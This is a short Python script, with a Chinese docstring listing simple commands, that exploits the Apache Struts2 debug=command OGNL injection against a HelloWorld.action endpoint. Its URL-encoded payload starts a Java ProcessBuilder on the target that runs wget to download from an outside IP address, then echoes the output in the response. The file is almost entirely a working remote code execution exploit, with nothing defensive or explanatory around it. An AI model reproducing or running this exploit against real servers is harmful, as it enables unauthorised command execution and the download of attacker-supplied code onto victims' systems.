# coding:utf-8
'''
只能执行简单的命令
whoami
pwd
id

'''
import requests

# ip http://localhost:8088/example/HelloWorld.action
url = 'http://localhost:8088/example/HelloWorld.action?debug=command&' \
      'expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27wget http://172.22.209.33:8014/api/download%27%29%29.start%28%29%2C%23b%3D%23a.' \
      'getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedR' \
      'eader%28%23c%29%2C%23e%3Dnew%20char%5B500000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.o' \
      'pensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.lan' \
      'g.String%28%23e%29%29%2C%20%23d.read%28%23e%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%' \
      '28%23e%29%29%20%2C%20%23d.read%28%23e%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e' \
      '%29%29%20%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29'
res = requests.get(url, timeout=5)
print res.text
